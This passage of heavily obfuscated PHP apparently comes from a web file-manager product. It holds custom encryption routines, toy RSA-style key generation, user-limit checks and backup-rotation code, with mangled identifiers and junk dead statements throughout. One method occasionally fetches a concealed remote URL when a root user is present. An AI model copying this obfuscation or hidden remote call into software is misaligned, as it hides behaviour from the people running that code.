$ŸÂúŸİ[269], $ŸÂúŸİ[281] => $ŸÂúŸİ[271], $ŸÂúŸİ[282] => $ŸÂúŸİ[273], $ŸÂúŸİ[283] => $ŸÂúŸİ[284], $ŸÂúŸİ[285] => $ŸÂúŸİ[275], $ŸÂúŸİ[286] => $ŸÂúŸİ[287], $ŸÂúŸİ[288] => $ŸÂúŸİ[277], $ŸÂúŸİ[289] => $ŸÂúŸİ[290], $ŸÂúŸİ[291] => $ŸÂúŸİ[292], $ŸÂúŸİ[293] => $ŸÂúŸİ[294]); $æüÑ©§ = $©¸…ÜÅ™[$this->ftem9eb6fbd5]; $æüÑ©§ = intval($æüÑ©§ ? $æüÑ©§ : $ŸÂúŸİ[269]); $£‰¹¿¦ = _get($this->evxgd8da858a, $ŸÂúŸİ[295]); $Ö¼€Ã‡³ = $ÍÅŠ‰ëÕ[768]; $£‰¹¿¦ = $£‰¹¿¦ ? intval($£‰¹¿¦) : 0; return $æüÑ©§ + $£‰¹¿¦; $ëËå™… = $ÍÅŠ‰ëÕ[769]; if (strlen($ëËå™…) < $ÍÅŠ‰ëÕ[693]) { return; } } public function ypbd27ecc090($Ú™ÄóÈ¡) { $¥”á‚Æ“ =& $_SERVER[™¸œØ®Ü]; $âîËô“· =& $_SERVER[è”ÜÓ§œ]; $ØêŠ†É = $this->ruav7966c869(); $œÕˆß×§ = $¥”á‚Æ“[770]; if ($Ú™ÄóÈ¡[$âîËô“·[296]] == $âîËô“·[122]) { return; } if ($ØêŠ†É >= intval($âîËô“·[214])) { return; } $Ú–ú¯µ€ = Model($âîËô“·[125])->count(); if ($Ú–ú¯µ€ <= $ØêŠ†É) { return; } $¦¯ÊÁ•ù = Model($âîËô“·[125])->field($âîËô“·[296])->limit($ØêŠ†É)->select(); $¦¯ÊÁ•ù = array_to_keyvalue($¦¯ÊÁ•ù, $âîËô“·[6], $âîËô“·[296]); $£ışóÔì = $¥”á‚Æ“[771]; if (strlen($£ışóÔì) < $¥”á‚Æ“[696]) { return; } if (!in_array($Ú™ÄóÈ¡[$âîËô“·[296]], $¦¯ÊÁ•ù)) { show_json($âîËô“·[297], !1, $âîËô“·[210]); } } public function dxbrc5c84e29() { $¢µ¾ü³Œ =& $_SERVER[™¸œØ®Ü]; $şô“Úú¨ =& $_SERVER[è”ÜÓ§œ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÅÎËÃé± = $şô“Úú¨[217]; $“Âß´ªü = $¢µ¾ü³Œ[772]; if (strlen($“Âß´ªü) < $¢µ¾ü³Œ[690]) { die; } $ÅÎËÃé± = $this->jpla227795c2($ÅÎËÃé±, $şô“Úú¨[218]); $Á¯¥ˆ‘ª = stream_context_create(array($şô“Úú¨[219] => array($şô“Úú¨[220] => $şô“Úú¨[221], $şô“Úú¨[222] => 3))); $”Å€”’ = @file_get_contents($ÅÎËÃé±, !1, $Á¯¥ˆ‘ª); echo $şô“Úú¨[298] . hash_encode($”Å€”’) . $şô“Úú¨[299]; $¬ó¼õô› = $¢µ¾ü³Œ[773]; } private function hvge41c67f4c($“–ÆçÉ¾, $Ï†—Êã, $¶ÄãÚŒ³ = 3) { $‚ÄäÚªÎ =& $_SERVER[™¸œØ®Ü]; $×§Òüó =& $_SERVER[è”ÜÓ§œ]; usleep(1); $Òö·¡Ø = $‚ÄäÚªÎ[774]; if (!$Òö·¡Ø) { return; } $“–ÆçÉ¾ = trim($“–ÆçÉ¾); $“ÆÖ†Á = mt_rand(0, 5) . $×§Òüó[6]; $ÉÎµñàå = rand_string(15); $ä¯Ùœ•µ = $‚ÄäÚªÎ[775]; if (!$ä¯Ùœ•µ) { return; } $Ì×ŸŞïÛ = $×§Òüó[300]; $¥Ä×ÛÙ = $‚ÄäÚªÎ[776]; if (strlen($¥Ä×ÛÙ) < $‚ÄäÚªÎ[690]) { die; } switch ($“ÆÖ†Á) { case $×§Òüó[206]: $—›Å‡Æ¹ = $this->qdwz4fcc9308($“–ÆçÉ¾, strrev($Ï†—Êã . $ÉÎµñàå)); break; case $×§Òüó[122]: $—›Å‡Æ¹ = $this->qdwz4fcc9308($“–ÆçÉ¾, strrev($ÉÎµñàå . $Ï†—Êã)); break; $©¦êğıš = $‚ÄäÚªÎ[777]; while ($©¦êğıš < $‚ÄäÚªÎ[693]) { if ($©¦êğıš >= 0) { break; } $©¦êğıš++; } case $×§Òüó[301]: $—›Å‡Æ¹ = $this->qdwz4fcc9308($“–ÆçÉ¾, base64_encode($ÉÎµñàå . $Ï†—Êã)); $Ó“É€éÆ = $‚ÄäÚªÎ[778]; if (!$Ó“É€éÆ) { die; } break; $ëßÁÍ¥ = $‚ÄäÚªÎ[779]; if (!$ëßÁÍ¥) { die; } case $×§Òüó[302]: $—›Å‡Æ¹ = $this->qdwz4fcc9308($“–ÆçÉ¾, md5($ÉÎµñàå . $Ï†—Êã)); $ï°ºÖË» = $‚ÄäÚªÎ[780]; break; $ôÚˆå–† = $‚ÄäÚªÎ[781]; while ($ôÚˆå–† < $‚ÄäÚªÎ[690]) { if ($ôÚˆå–† >= 0) { break; } $ôÚˆå–†++; } case $×§Òüó[303]: $“–ÆçÉ¾ = base64_encode($“–ÆçÉ¾); $°ª„Æ—¬ = rand(0, 64); $šÅ£Œ½¡ = $‚ÄäÚªÎ[782]; if (strlen($šÅ£Œ½¡) < $‚ÄäÚªÎ[693]) { return; } $Í“¿ ×ç = $Ì×ŸŞïÛ[$°ª„Æ—¬]; $åÆ…”–† = md5($Í“¿ ×ç . md5($Ï†—Êã . $Í“¿ ×ç) . $Ï†—Êã); $åÆ…”–† = substr($åÆ…”–†, $°ª„Æ—¬ % 8, $°ª„Æ—¬ % 8 + 7); $â‡¹“€– = $×§Òüó[6]; $„±™§ƒâ = $‚ÄäÚªÎ[783]; while ($„±™§ƒâ < $‚ÄäÚªÎ[693]) { if ($„±™§ƒâ >= 0) { break; } $„±™§ƒâ++; } $áË—’¥Ê = 0; $Ôì¢ÄÓˆ = $‚ÄäÚªÎ[784]; while ($Ôì¢ÄÓˆ < $‚ÄäÚªÎ[693]) { if ($Ôì¢ÄÓˆ >= 0) { break; } $Ôì¢ÄÓˆ++; } $÷ñã†Åò = 0; $š‡±¥£“ = $‚ÄäÚªÎ[785]; $‹œù±Ü = 0; $¾·°Äù = $‚ÄäÚªÎ[786]; while (strlen($¾·°Äù) < $‚ÄäÚªÎ[693]) { if (!$¾·°Äù) { break; } $¾·°Äù++; } for ($áË—’¥Ê = 0; $áË—’¥Ê < strlen($“–ÆçÉ¾); $áË—’¥Ê++) { $‹œù±Ü = $‹œù±Ü == strlen($åÆ…”–†) ? 0 : $‹œù±Ü; $÷ñã†Åò = ($°ª„Æ—¬ + strpos($Ì×ŸŞïÛ, $“–ÆçÉ¾[$áË—’¥Ê]) + ord($åÆ…”–†[$‹œù±Ü++])) % 64; $â‡¹“€– .= $Ì×ŸŞïÛ[$÷ñã†Åò]; $»œ¨àÚ = $‚ÄäÚªÎ[787]; if (strlen($»œ¨àÚ) < $‚ÄäÚªÎ[696]) { return; } } $—›Å‡Æ¹ = hash_encode($Í“¿ ×ç . $â‡¹“€–); break; $ª÷‚„äæ = $‚ÄäÚªÎ[788]; if (!$ª÷‚„äæ) { return; } default: $—›Å‡Æ¹ = $this->qdwz4fcc9308($“–ÆçÉ¾, $Ï†—Êã . $ÉÎµñàå); $È»¨¸‰¹ = $‚ÄäÚªÎ[789]; if (!$È»¨¸‰¹) { die; } break; $¯î„Û´® = $‚ÄäÚªÎ[790]; } $—›Å‡Æ¹ = strrev($“ÆÖ†Á . $ÉÎµñàå . $—›Å‡Æ¹); if ($¶ÄãÚŒ³ - 1 > 0) { $—›Å‡Æ¹ = $this->hvge41c67f4c($—›Å‡Æ¹, $Ï†—Êã, $¶ÄãÚŒ³ - 1); } return $—›Å‡Æ¹; } private function wpzh6241c6e2($ÇšĞöüŠ, $Ç”Åçœ, $¯æš·¯­ = 3) { $Ú‘ò°¥¬ =& $_SERVER[™¸œØ®Ü]; $…‘Ş¼æ“ =& $_SERVER[è”ÜÓ§œ]; if (!is_string($ÇšĞöüŠ) || strlen($ÇšĞöüŠ) < 10) { return !1; } $ÇšĞöüŠ = trim($ÇšĞöüŠ); $†²¼Í¯ø = $Ú‘ò°¥¬[791]; while (strlen($†²¼Í¯ø) < $Ú‘ò°¥¬[698]) { if (!$†²¼Í¯ø) { break; } $†²¼Í¯ø++; } $ÇšĞöüŠ = strrev($ÇšĞöüŠ); $ì‰øÈ’Ø = $ÇšĞöüŠ[0]; $ø·õÄÔ¹ = $Ú‘ò°¥¬[792]; while (strlen($ø·õÄÔ¹) < $Ú‘ò°¥¬[696]) { if (!$ø·õÄÔ¹) { break; } $ø·õÄÔ¹++; } $›æş×Ş’ = substr($ÇšĞöüŠ, 1, 15); $Òƒ‡ò“å = $Ú‘ò°¥¬[793]; if (strlen($Òƒ‡ò“å) < $Ú‘ò°¥¬[690]) { die; } $ÇšĞöüŠ = substr($ÇšĞöüŠ, 16); $âÂ‹–× = $…‘Ş¼æ“[300]; $¢Úè¾õ› = $Ú‘ò°¥¬[794]; while (strlen($¢Úè¾õ›) < $Ú‘ò°¥¬[698]) { if (!$¢Úè¾õ›) { break; } $¢Úè¾õ›++; } switch ($ì‰øÈ’Ø) { case $…‘Ş¼æ“[206]: $Œ›¸å›¡ = $this->jpla227795c2($ÇšĞöüŠ, strrev($Ç”Åçœ . $›æş×Ş’)); break; $…Ò÷¯ó™ = $Ú‘ò°¥¬[795]; while (strlen($…Ò÷¯ó™) < $Ú‘ò°¥¬[693]) { if (!$…Ò÷¯ó™) { break; } $…Ò÷¯ó™++; } case $…‘Ş¼æ“[122]: $Œ›¸å›¡ = $this->jpla227795c2($ÇšĞöüŠ, strrev($›æş×Ş’ . $Ç”Åçœ)); $¢€ó…® = $Ú‘ò°¥¬[796]; while (strlen($¢€ó…®) < $Ú‘ò°¥¬[696]) { if (!$¢€ó…®) { break; } $¢€ó…®++; } break; $Ÿ¦ÑÙ = $Ú‘ò°¥¬[797]; if (!$Ÿ¦ÑÙ) { return; } case $…‘Ş¼æ“[301]: $Œ›¸å›¡ = $this->jpla227795c2($ÇšĞöüŠ, base64_encode($›æş×Ş’ . $Ç”Åçœ)); break; $»•”¯†Ê = $Ú‘ò°¥¬[798]; if (strlen($»•”¯†Ê) < $Ú‘ò°¥¬[693]) { return; } case $…‘Ş¼æ“[302]: $Œ›¸å›¡ = $this->jpla227795c2($ÇšĞöüŠ, md5($›æş×Ş’ . $Ç”Åçœ)); $õ”™ˆç© = $Ú‘ò°¥¬[799]; if (!$õ”™ˆç©) { return; } break; case $…‘Ş¼æ“[303]: $ÇšĞöüŠ = hash_decode($ÇšĞöüŠ); $ØöœĞÄª = $ÇšĞöüŠ[0]; $ä¼Éä Ò = $Ú‘ò°¥¬[800]; while (strlen($ä¼Éä Ò) < $Ú‘ò°¥¬[696]) { if (!$ä¼Éä Ò) { break; } $ä¼Éä Ò++; } $ÇšĞöüŠ = substr($ÇšĞöüŠ, 1); $ì®Ò¶› = $Ú‘ò°¥¬[801]; if (strlen($ì®Ò¶›) < $Ú‘ò°¥¬[696]) { die; } $Û˜í­™Æ = strpos($âÂ‹–×, $ØöœĞÄª); $š•Äş = $Ú‘ò°¥¬[802]; if (strlen($š•Äş) < $Ú‘ò°¥¬[690]) { return; } $¥¹·µ¡™ = md5($ØöœĞÄª . md5($Ç”Åçœ . $ØöœĞÄª) . $Ç”Åçœ); $¥¹·µ¡™ = substr($¥¹·µ¡™, $Û˜í­™Æ % 8, $Û˜í­™Æ % 8 + 7); $Œˆª’—¢ = $Ú‘ò°¥¬[803]; $Ùû¯±¥Á = $…‘Ş¼æ“[6]; $»±åüª™ = $Ú‘ò°¥¬[804]; $‰µ¼€×ô = 0; $©™ÆÙ½• = 0; $“©™ù¬ = $Ú‘ò°¥¬[805]; if (strlen($“©™ù¬) < $Ú‘ò°¥¬[700]) { die; } $«ßõØûî = 0; for ($‰µ¼€×ô = 0; $‰µ¼€×ô < strlen($ÇšĞöüŠ); $‰µ¼€×ô++) { $«ßõØûî = $«ßõØûî == strlen($¥¹·µ¡™) ? 0 : $«ßõØûî; $…ËğÍ¯» = $Ú‘ò°¥¬[806]; while (strlen($…ËğÍ¯») < $Ú‘ò°¥¬[696]) { if (!$…ËğÍ¯») { break; } $…ËğÍ¯»++; } $‡Øé²—Í = $«ßõØûî++; $²×¼¾ÃÒ = $Ú‘ò°¥¬[807]; while ($²×¼¾ÃÒ < $Ú‘ò°¥¬[696]) { if ($²×¼¾ÃÒ >= 0) { break; } $²×¼¾ÃÒ++; } $©™ÆÙ½• = strpos($âÂ‹–×, $ÇšĞöüŠ[$‰µ¼€×ô]) - $Û˜í­™Æ - ord($¥¹·µ¡™[$‡Øé²—Í]); $®å€’Šä = $Ú‘ò°¥¬[808]; while (strlen($®å€’Šä) < $Ú‘ò°¥¬[698]) { if (!$®å€’Šä) { break; } $®å€’Šä++; } while ($©™ÆÙ½• < 0) { $©™ÆÙ½• += 64; $ÒÈ¹œûŞ = $Ú‘ò°¥¬[809]; } $Ùû¯±¥Á .= $âÂ‹–×[$©™ÆÙ½•]; } $Œ›¸å›¡ = base64_decode($Ùû¯±¥Á); $âĞ½İ§ú = $Ú‘ò°¥¬[810]; break; default: $Œ›¸å›¡ = $this->jpla227795c2($ÇšĞöüŠ, $Ç”Åçœ . $›æş×Ş’); break; } if ($¯æš·¯­ - 1 > 0) { $Œ›¸å›¡ = $this->wpzh6241c6e2($Œ›¸å›¡, $Ç”Åçœ, $¯æš·¯­ - 1); } return $Œ›¸å›¡; } public function silt27add1e7($Ã™­å§º) { $—Éã÷ˆ« =& $_SERVER[™¸œØ®Ü]; $£¢–Ÿ»ë =& $_SERVER[è”ÜÓ§œ]; $àÑ€ã½€ = $this->ryuwdbc6f0b2(); $éÔÃÍ–‹ = $—Éã÷ˆ«[811]; if (!$éÔÃÍ–‹) { die; } $ãœ÷¹Ã = $this->ryuwdbc6f0b2(); $ü™ô¨ÕŒ = $—Éã÷ˆ«[812]; while (strlen($ü™ô¨ÕŒ) < $—Éã÷ˆ«[696]) { if (!$ü™ô¨ÕŒ) { break; } $ü™ô¨ÕŒ++; } $üß¡Õ¢Ä = ($àÑ€ã½€ - 1) * ($ãœ÷¹Ã - 1); $ë¢’˜É¤ = $—Éã÷ˆ«[813]; while ($ë¢’˜É¤ < $—Éã÷ˆ«[693]) { if ($ë¢’˜É¤ >= 0) { break; } $ë¢’˜É¤++; } $Ö‚Àà¢ = intval(($àÑ€ã½€ + $ãœ÷¹Ã) / 2); while (1) { $à‘ê İ = $Ö‚Àà¢; $ıš°ˆ²Ì = $üß¡Õ¢Ä; $­å„¹™á = $—Éã÷ˆ«[814]; while ($­å„¹™á < $—Éã÷ˆ«[690]) { if ($­å„¹™á >= 0) { break; } $­å„¹™á++; } while ($ıš°ˆ²Ì % $à‘ê İ != 0) { $ÉÑ¯õª˜ = $ıš°ˆ²Ì; $ıš°ˆ²Ì = $à‘ê İ; $à‘ê İ = $ÉÑ¯õª˜ % $à‘ê İ; } if ($à‘ê İ == 1) { break; } else { $Ö‚Àà¢++; } } $Á†í…ìÑ = 2; $ëÈÚ¯¤× = $—Éã÷ˆ«[739]; for ($¾–¤¶áæ = 0; $¾–¤¶áæ < $üß¡Õ¢Ä * 10; $¾–¤¶áæ++) { if (($üß¡Õ¢Ä * $¾–¤¶áæ + 1) % $Ö‚Àà¢ == 0) { $Á†í…ìÑ = intval(($üß¡Õ¢Ä * $¾–¤¶áæ + 1) / $Ö‚Àà¢); break; } } $˜´Úõ·Í = $this->qdwz4fcc9308($àÑ€ã½€ * $ãœ÷¹Ã . $£¢–Ÿ»ë[6], $£¢–Ÿ»ë[136]); $ÜĞ“è = $—Éã÷ˆ«[815]; while ($ÜĞ“è < $—Éã÷ˆ«[693]) { if ($ÜĞ“è >= 0) { break; } $ÜĞ“è++; } $ó÷ŒÕş’ = md5($£¢–Ÿ»ë[304] . ($àÑ€ã½€ + $ãœ÷¹Ã) . $£¢–Ÿ»ë[305] . $Ö‚Àà¢ . $£¢–Ÿ»ë[305] . $Á†í…ìÑ . $£¢–Ÿ»ë[306]); $¹åü›‰˜ = $this->qdwz4fcc9308($Ã™­å§º, $ó÷ŒÕş’) . $£¢–Ÿ»ë[307] . $˜´Úõ·Í; $ß›‹®×ğ = $—Éã÷ˆ«[816]; if (!$ß›‹®×ğ) { die; } return $¹åü›‰˜; } public function qlkv66dc50a3($—­ÆÅÅµ) { $³³şÊş² =& $_SERVER[™¸œØ®Ü]; $ö‰¶•»å =& $_SERVER[è”ÜÓ§œ]; $ŞŒãó‚¤ = explode($ö‰¶•»å[307], $—­ÆÅÅµ); $ÆîË¤¶ï = $³³şÊş²[763]; if (!$ÆîË¤¶ï) { die; } if (count($ŞŒãó‚¤) != 2) { return $ö‰¶•»å[6]; } $›»ğñ¤® = $this->jpla227795c2($ŞŒãó‚¤[1] . $ö‰¶•»å[6], $ö‰¶•»å[136]); $í¹±ğ“ˆ = $³³şÊş²[817]; while ($í¹±ğ“ˆ < $³³şÊş²[690]) { if ($í¹±ğ“ˆ >= 0) { break; } $í¹±ğ“ˆ++; } if (!$›»ğñ¤®) { return $ö‰¶•»å[6]; } $›»ğñ¤® = intval($›»ğñ¤®); $¯ŠÕ¶¿ = 0; $¦àÓŠŠš = $³³şÊş²[818]; if (!$¦àÓŠŠš) { return; } $íöØóª¶ = 0; $ËİÒäÂ = $³³şÊş²[819]; while (strlen($ËİÒäÂ) < $³³şÊş²[690]) { if (!$ËİÒäÂ) { break; } $ËİÒäÂ++; } for ($£Õáà¹ = 3; $£Õáà¹ < $›»ğñ¤®; $£Õáà¹ += 2) { if ($›»ğñ¤® % $£Õáà¹ != 0) { continue; } $¯ŠÕ¶¿ = $£Õáà¹; $ó–¼Ë“ = $³³şÊş²[820]; $íöØóª¶ = intval($›»ğñ¤® / $£Õáà¹); $ØÀµ½é = $³³şÊş²[821]; while ($ØÀµ½é < $³³şÊş²[700]) { if ($ØÀµ½é >= 0) { break; } $ØÀµ½é++; } break; $ñ«Ñìş = $³³şÊş²[822]; } $™åº‹” = ($¯ŠÕ¶¿ - 1) * ($íöØóª¶ - 1); $§Ó³‡Û = intval(($¯ŠÕ¶¿ + $íöØóª¶) / 2); while (1) { $¼áõ¯ê¨ = $§Ó³‡Û; $Ş©Àë†° = $™åº‹”; $ê¬—ïåå = $³³şÊş²[823]; while (strlen($ê¬—ïåå) < $³³şÊş²[700]) { if (!$ê¬—ïåå) { break; } $ê¬—ïåå++; } while ($Ş©Àë†° % $¼áõ¯ê¨ != 0) { $¦·ƒ—… = $Ş©Àë†°; $¯å¥óï = $³³şÊş²[824]; while (strlen($¯å¥óï) < $³³şÊş²[693]) { if (!$¯å¥óï) { break; } $¯å¥óï++; } $Ş©Àë†° = $¼áõ¯ê¨; $Ø¸âÚˆ¾ = $³³şÊş²[825]; if (!$Ø¸âÚˆ¾) { die; } $¼áõ¯ê¨ = $¦·ƒ—… % $¼áõ¯ê¨; $ª«‡˜Ü» = $³³şÊş²[826]; if (strlen($ª«‡˜Ü») < $³³şÊş²[693]) { return; } } if ($¼áõ¯ê¨ == 1) { break; } else { $§Ó³‡Û++; } } $ä ô“«ò = 2; for ($£Õáà¹ = 0; $£Õáà¹ < $™åº‹” * 10; $£Õáà¹++) { if (($™åº‹” * $£Õáà¹ + 1) % $§Ó³‡Û == 0) { $ä ô“«ò = intval(($™åº‹” * $£Õáà¹ + 1) / $§Ó³‡Û); break; } } $û¥ª§€Í = md5($ö‰¶•»å[304] . ($¯ŠÕ¶¿ + $íöØóª¶) . $ö‰¶•»å[305] . $§Ó³‡Û . $ö‰¶•»å[305] . $ä ô“«ò . $ö‰¶•»å[306]); $Úñ·ú£ä = $this->jpla227795c2($ŞŒãó‚¤[0], $û¥ª§€Í); return $Úñ·ú£ä; } public function ryuwdbc6f0b2() { $¡ÊŒÜûĞ =& $_SERVER[™¸œØ®Ü]; $Î­¼²·Ñ = mt_rand(pow(2, 14), pow(2, 16) - 1); $òéù°ĞÖ = array(); $ŠÚ†òúº = 1; $ĞÚı•ûÂ = $¡ÊŒÜûĞ[827]; if (strlen($ĞÚı•ûÂ) < $¡ÊŒÜûĞ[696]) { return; } while ($ŠÚ†òúº <= (int) sqrt($Î­¼²·Ñ)) { $ Ÿ´™ÏË = $ŠÚ†òúº; while (!0) { $ Ÿ´™ÏË++; if ($ Ÿ´™ÏË <= 2) { $ŠÚ†òúº = $ Ÿ´™ÏË; break; } else { if ($ Ÿ´™ÏË < 2) { continue; } } $ëØ™ø› = !0; for ($şä¥²Ã = 2; $şä¥²Ã <= sqrt($ Ÿ´™ÏË); $şä¥²Ã++) { if ($ Ÿ´™ÏË % $şä¥²Ã == 0) { $ëØ™ø› = !1; } } if ($ëØ™ø›) { $ŠÚ†òúº = $ Ÿ´™ÏË; break; } } $òéù°ĞÖ[] = $ŠÚ†òúº; $„ğõ¨Àñ = $¡ÊŒÜûĞ[828]; if (strlen($„ğõ¨Àñ) < $¡ÊŒÜûĞ[696]) { die; } } $ÏÈÂ­Æ¡ = 2; for ($ Ÿ´™ÏË = $Î­¼²·Ñ; $ Ÿ´™ÏË > 1; $ Ÿ´™ÏË--) { $ëØ™ø› = !0; foreach ($òéù°ĞÖ as $Œ¦îË£ö) { if ($ Ÿ´™ÏË % $Œ¦îË£ö == 0) { $ëØ™ø› = !1; break; } } if ($ëØ™ø›) { $ÏÈÂ­Æ¡ = $ Ÿ´™ÏË; break; } } return $ÏÈÂ­Æ¡; $ªİÁÚÅÙ = $¡ÊŒÜûĞ[829]; if (strlen($ªİÁÚÅÙ) < $¡ÊŒÜûĞ[698]) { die; } } public function kcgjd3fec78b($æáàœŸÃ, $Òï¢§á¢) { $ş–Æê‘ë =& $_SERVER[™¸œØ®Ü]; $ÚÃïù¹ª =& $_SERVER[è”ÜÓ§œ]; return call_user_func(array($ÚÃïù¹ª[8], $ÚÃïù¹ª[308]), $æáàœŸÃ, $Òï¢§á¢); $€§†ã‡½ = $ş–Æê‘ë[830]; if (strlen($€§†ã‡½) < $ş–Æê‘ë[700]) { return; } } public function qdwz4fcc9308($ˆôÈ¿›û, $…­«¡ÃÂ) { $Ï’…¡ÓË =& $_SERVER[™¸œØ®Ü]; $ÊÖîˆâ =& $_SERVER[è”ÜÓ§œ]; return call_user_func(array($ÊÖîˆâ[309], $ÊÖîˆâ[310]), $ˆôÈ¿›û, $…­«¡ÃÂ); $×‘«Èğ = $Ï’…¡ÓË[831]; while (strlen($×‘«Èğ) < $Ï’…¡ÓË[690]) { if (!$×‘«Èğ) { break; } $×‘«Èğ++; } } public function jpla227795c2($úœåÉô, $ãôäó¨ƒ) { $»£ñ— =& $_SERVER[è”ÜÓ§œ]; return call_user_func(array($»£ñ—[309], $»£ñ—[311]), $úœåÉô, $ãôäó¨ƒ); $İı¸ç–Ê = $_SERVER[™¸œØ®Ü][832]; if (!$İı¸ç–Ê) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[™¸œØ®Ü][833]); $this->init(); $this->keep(); } public function init() { $ªøÓ½› =& $_SERVER[™¸œØ®Ü]; $this->isManual(); self::$name = date($ªøÓ½›[834]); if (!($¢¦™ì»Ã = $this->model->lastItem())) { $¢¦™ì»Ã = $this->initData(); } else { self::$name = $¢¦™ì»Ã[$ªøÓ½›[32]]; if ($¢¦™ì»Ã[$ªøÓ½›[835]] == $ªøÓ½›[91]) { self::$name = date($ªøÓ½›[261]); $´İö³š€ = intval(_get($¢¦™ì»Ã, $ªøÓ½›[836], 0)); if (self::$manual == 0 && $¢¦™ì»Ã[$ªøÓ½›[32]] == self::$name) { $this->model->remove($¢¦™ì»Ã[$ªøÓ½›[477]]); } $¢¦™ì»Ã = $this->initData($´İö³š€, $¢¦™ì»Ã[$ªøÓ½›[837]]); } else { $this->checkStore($¢¦™ì»Ã[$ªøÓ½›[837]]); } } self::$option = $¢¦™ì»Ã; } private function isManual() { $Ö‹¢œ“” = _get($GLOBALS, $_SERVER[™¸œØ®Ü][838], 0); $Ö‹¢œ“” = intval($Ö‹¢œ“”); self::$manual = $Ö‹¢œ“” && $Ö‹¢œ“” == 1 ? 1 : 0; } private function initData($ÏÎäÕÔç = 0, $ÊİÖÎ¬ = '') { $®‰ë»Í =& $_SERVER[™¸œØ®Ü]; $Ââ’ŒÊŒ = $this->model->config(); if ($ÊİÖÎ¬ && $Ââ’ŒÊŒ[$®‰ë»Í[837]] != $ÊİÖÎ¬) { $ÏÎäÕÔç = 0; } $this->checkStore($Ââ’ŒÊŒ[$®‰ë»Í[837]]); if (self::$manual == 1) { self::$name .= $®‰ë»Í[11] . date($®‰ë»Í[839]); } $¦ˆ¡Ş¦Ã = array($®‰ë»Í[837] => $Ââ’ŒÊŒ[$®‰ë»Í[837]], $®‰ë»Í[32] => self::$name, $®‰ë»Í[835] => 0, $®‰ë»Í[171] => $Ââ’ŒÊŒ[$®‰ë»Í[171]], $®‰ë»Í[840] => self::$manual, $®‰ë»Í[370] => array($®‰ë»Í[841] => array($®‰ë»Í[835] => 0), $®‰ë»Í[842] => array($®‰ë»Í[835] => 0, $®‰ë»Í[843] => 0, $®‰ë»Í[844] => 0, $®‰ë»Í[33] => $®‰ë»Í[12], $®‰ë»Í[845] => 0, $®‰ë»Í[846] => 0), $®‰ë»Í[847] => array($®‰ë»Í[835] => 0, $®‰ë»Í[843] => 0, $®‰ë»Í[844] => 0, $®‰ë»Í[845] => 0, $®‰ë»Í[846] => 0), $®‰ë»Í[232] => array($®‰ë»Í[835] => 0, $®‰ë»Í[848] => 0, $®‰ë»Í[849] => 0, $®‰ë»Í[850] => 0, $®‰ë»Í[851] => 0, $®‰ë»Í[545] => $ÏÎäÕÔç, $®‰ë»Í[845] => 0, $®‰ë»Í[846] => 0)), $®‰ë»Í[845] => time(), $®‰ë»Í[846] => 0); $ş“†¦ÇÓ = $this->model->insert($¦ˆ¡Ş¦Ã); $¦ˆ¡Ş¦Ã[$®‰ë»Í[477]] = $ş“†¦ÇÓ; return $¦ˆ¡Ş¦Ã; } private function checkStore($Å›¾ÛÌ˜) { $®‹²õ = Model($_SERVER[™¸œØ®Ü][852]); $™‡’Õ¾ = $®‹²õ->listData($Å›¾ÛÌ˜); $®‹²õ->checkConfig($™‡’Õ¾); } public static function get() { if (!self::$option) { $Ø¦ÌößÑ = Model($_SERVER[™¸œØ®Ü][833]); $¶æ¸Ê» = $Ø¦ÌößÑ->findByName(self::$name); $Ø¦ÌößÑ->parseContent($¶æ¸Ê»); self::$option = $¶æ¸Ê»; } return self::$option; } public static function set($¶¥ÂŒíÔ) { $£Ôëûã =& $_SERVER[™¸œØ®Ü]; $Ï¿ä¦óß = self::get(); foreach ($¶¥ÂŒíÔ as $…œƒÙÕğ => $š“º˜ƒ¢) { array_set_value($Ï¿ä¦óß, $…œƒÙÕğ, $š“º˜ƒ¢); } Model($£Ôëûã[833])->update($Ï¿ä¦óß[$£Ôëûã[477]], $Ï¿ä¦óß); self::$option = $Ï¿ä¦óß; return self::$option; } public function keep() { $¯ƒ› =& $_SERVER[™¸œØ®Ü]; $—ıüÏê = self::get(); if (_get($—ıüÏê, $¯ƒ›[853], 0) == $¯ƒ›[91]) { return; } $this->backupKeep($—ıüÏê); self::set(array($¯ƒ›[853] => 1)); } private function backupKeep($Ï‚Âö¡²) { $åÅãƒò³ =& $_SERVER[™¸œØ®Ü]; if (self::$manual == 1) { return; } $ßÄÜááæ = $this->model->listData(); if (empty($ßÄÜááæ)) { return; } $©û¾­‰ = 0; $ÕŞ’ğÅû = array(); foreach ($ßÄÜááæ as $ŒØÍ°¡°) { if ($©û¾­‰ >= 7) { break; } $ÕŞ’ğÅû[] = $ŒØÍ°¡°[$åÅãƒò³[32]]; $©û¾­‰++; } for ($©û¾­‰ = 0; $©û¾­‰ < 12; $©û¾­‰++) { $ÕŞ’ğÅû[] = date($åÅãƒò³[854], strtotime("\55{$©û¾­‰}\40\155\x6f\x6e\x74\150\163")); } $ÕŞ’ğÅû = array_unique($ÕŞ’ğÅû); $÷À‰Õœ = Model($åÅãƒò³[855])->get($åÅãƒò³[856]); foreach ($ßÄÜááæ as $ŒØÍ°¡°) { if (isset($ŒØÍ°¡°[$åÅãƒò³[840]]) && $ŒØÍ°¡°[$åÅãƒò³[840]] == $åÅãƒò³[91]) { continue; } if (!empty($ŒØÍ°¡°[$åÅãƒò³[32]]) && in_array($ŒØÍ°¡°[$åÅãƒò³[32]], $ÕŞ’ğÅû)) { continue; } $this->model->remove($ŒØÍ°¡°[$åÅãƒò³[477]]); $ØÄœ¨ˆ¸ = $this->backupPath($Ï‚Âö¡², $÷À‰Õœ); IO::remove($ØÄœ¨ˆ¸, !1); } } private function backupPath($Â”«Æ, $Â½¦ıêĞ = false) { $ôÏÔı²Ã =& $_SERVER[™¸œØ®Ü]; if (!$Â½¦ıêĞ) { $Â½¦ıêĞ = Model($ôÏÔı²Ã[855])->get($ôÏÔı²Ã[856]); } $€°ŒÓ¶Ì = $Â”«Æ[$ôÏÔı²Ã[32]]; $ƒéïŸÛ¤ = substr(md5($ôÏÔı²Ã[857] . $Â½¦ıêĞ . $€°ŒÓ¶Ì), 0, 8); return "\x7b\151\157\x3a{$Â”«Æ[$ôÏÔı²Ã[837]]}\x7d\x2f\144\x61\164\x61\142\x61\x73\x65\57\x62\141\143\153\165\160\x2f" . $€°ŒÓ¶Ì . $ôÏÔı²Ã[11] . $ƒéïŸÛ¤; } public function db() { $àÒØ§úÌ =& $_SERVER[™¸œØ®Ü]; $‰¶úÌŒÉ = self::get(); if (_get($‰¶úÌŒÉ, 